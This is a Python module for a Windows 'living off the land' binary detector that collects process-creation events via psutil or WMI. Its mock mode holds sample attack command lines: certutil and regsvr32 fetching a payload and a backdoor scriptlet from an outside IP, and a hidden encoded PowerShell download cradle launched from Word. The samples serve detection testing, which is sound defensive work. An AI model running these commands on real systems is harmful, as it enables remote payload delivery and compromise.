"""Process creation telemetry collector supporting WMI, psutil polling, and mock replay."""

from collections.abc import Iterator
import logging
import time
import psutil

from utils.models import ProcessEvent

logger = logging.getLogger("lolbins-detector.collector")


class ProcessCollector:
    """Collects Windows process creation events in real time or simulation mode."""

    def __init__(
        self,
        mode: str = "psutil_polling",
        poll_interval: float = 1.0,
        ignore_images: list[str] | None = None,
    ) -> None:
        """Initialize the process collector.

        Args:
            mode: Collection mode ('psutil_polling', 'wmi', or 'mock').
            poll_interval: Interval in seconds between process polls.
            ignore_images: List of executable names to ignore.
        """
        self.mode = mode.lower()
        self.poll_interval = poll_interval
        self.ignore_images = {img.lower() for img in (ignore_images or [])}
        self._running = False

    def stop(self) -> None:
        """Signal the collector loop to stop."""
        self._running = False

    def stream_events(self) -> Iterator[ProcessEvent]:
        """Yield ProcessEvent objects based on the configured collection mode."""
        self._running = True
        if self.mode == "mock":
            yield from self._stream_mock_events()
        elif self.mode == "wmi":
            yield from self._stream_wmi_events()
        else:
            yield from self._stream_psutil_events()

    def _stream_psutil_events(self) -> Iterator[ProcessEvent]:
        """Monitor new process creations via cross-compatible psutil polling."""
        seen_pids: set[int] = {p.pid for p in psutil.process_iter(["pid"])}
        logger.info(
            "Started psutil process monitor (baseline: %d active processes)",
            len(seen_pids),
        )

        while self._running:
            current_pids: set[int] = set()
            for proc in psutil.process_iter(
                ["pid", "ppid", "name", "exe", "cmdline", "username"]
            ):
                try:
                    info = proc.info
                    pid = info["pid"]
                    current_pids.add(pid)

                    if pid in seen_pids:
                        continue

                    image = info.get("exe") or info.get("name") or "UNKNOWN"
                    cmdline_list = info.get("cmdline") or []
                    command_line = (
                        " ".join(cmdline_list) if cmdline_list else str(image)
                    )
                    ppid = info.get("ppid") or 0
                    user = info.get("username") or "SYSTEM"

                    parent_image = self._resolve_process_image(ppid)
                    integrity_level = self._infer_integrity_level(user)

                    event = ProcessEvent(
                        pid=pid,
                        ppid=ppid,
                        image=image,
                        command_line=command_line,
                        user=user,
                        parent_image=parent_image,
                        integrity_level=integrity_level,
                    )

                    if event.image_name not in self.ignore_images:
                        yield event

                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            seen_pids = current_pids
            time.sleep(self.poll_interval)

    def _stream_wmi_events(self) -> Iterator[ProcessEvent]:
        """Monitor new process creations using Windows Management Instrumentation (WMI)."""
        try:
            import wmi  # type: ignore[import-untyped]
        except ImportError:
            logger.warning(
                "WMI module not available; falling back to psutil_polling mode."
            )
            yield from self._stream_psutil_events()
            return

        logger.info("Started Windows WMI Win32_Process watcher")
        c = wmi.WMI()
        process_watcher = c.Win32_Process.watch_for("creation")

        while self._running:
            try:
                new_proc = process_watcher(timeout_ms=int(self.poll_interval * 1000))
                pid = int(new_proc.ProcessId or 0)
                ppid = int(new_proc.ParentProcessId or 0)
                image = str(
                    new_proc.ExecutablePath or new_proc.Name or "UNKNOWN"
                )
                command_line = str(new_proc.CommandLine or image)
                parent_image = self._resolve_process_image(ppid)

                event = ProcessEvent(
                    pid=pid,
                    ppid=ppid,
                    image=image,
                    command_line=command_line,
                    user="LOCAL\\User",
                    parent_image=parent_image,
                    integrity_level="Medium",
                )
                if event.image_name not in self.ignore_images:
                    yield event
            except wmi.x_wmi_timed_out:
                continue
            except Exception as exc:
                logger.error("WMI watcher error: %s", exc)
                time.sleep(self.poll_interval)

    def _stream_mock_events(self) -> Iterator[ProcessEvent]:
        """Yield realistic synthetic Windows process creation events for testing."""
        logger.info("Streaming simulated Windows process events (mock mode)")
        sample_events = [
            ProcessEvent(
                pid=4120,
                ppid=1044,
                image=r"C:\Windows\System32\svchost.exe",
                command_line=r"C:\Windows\System32\svchost.exe -k netsvcs -p",
                user=r"NT AUTHORITY\SYSTEM",
                parent_image=r"C:\Windows\System32\services.exe",
                integrity_level="System",
            ),
            ProcessEvent(
                pid=6832,
                ppid=3912,
                image=r"C:\Windows\System32\certutil.exe",
                command_line=(
                    r"certutil.exe -urlcache -split -f "
                    r"http://198.51.100.42/payload.bin C:\ProgramData\update.bin"
                ),
                user=r"WORKSTATION\StandardUser",
                parent_image=r"C:\Windows\System32\cmd.exe",
                integrity_level="Medium",
            ),
            ProcessEvent(
                pid=7416,
                ppid=5200,
                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                command_line=(
                    r"powershell.exe -NoP -W Hidden -Enc "
                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
                ),
                user=r"WORKSTATION\StandardUser",
                parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                integrity_level="Medium",
            ),
            ProcessEvent(
                pid=8104,
                ppid=6120,
                image=r"C:\Windows\System32\regsvr32.exe",
                command_line=r"regsvr32.exe /s /n /u /i:http://198.51.100.42/backdoor.sct scrobj.dll",
                user=r"WORKSTATION\AdminUser",
                parent_image=r"C:\Windows\explorer.exe",
                integrity_level="High",
            ),
        ]

        for event in sample_events:
            if not self._running:
                break
            if event.image_name not in self.ignore_images:
                yield event
        self._running = False

    @staticmethod
    def _resolve_process_image(pid: int) -> str:
        """Resolve the executable path or name of a parent process by PID."""
        if pid <= 0:
            return "System"
        try:
            parent = psutil.Process(pid)
            return parent.exe() or parent.name()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            return "UNKNOWN"

    @staticmethod
    def _infer_integrity_level(username: str) -> str:
        """Estimate Windows process integrity level based on account context."""
        upper_user = username.upper()
        if "SYSTEM" in upper_user or "LOCAL SERVICE" in upper_user or "NETWORK SERVICE" in upper_user:
            return "System"
        if "ADMIN" in upper_user:
            return "High"
        return "Medium"
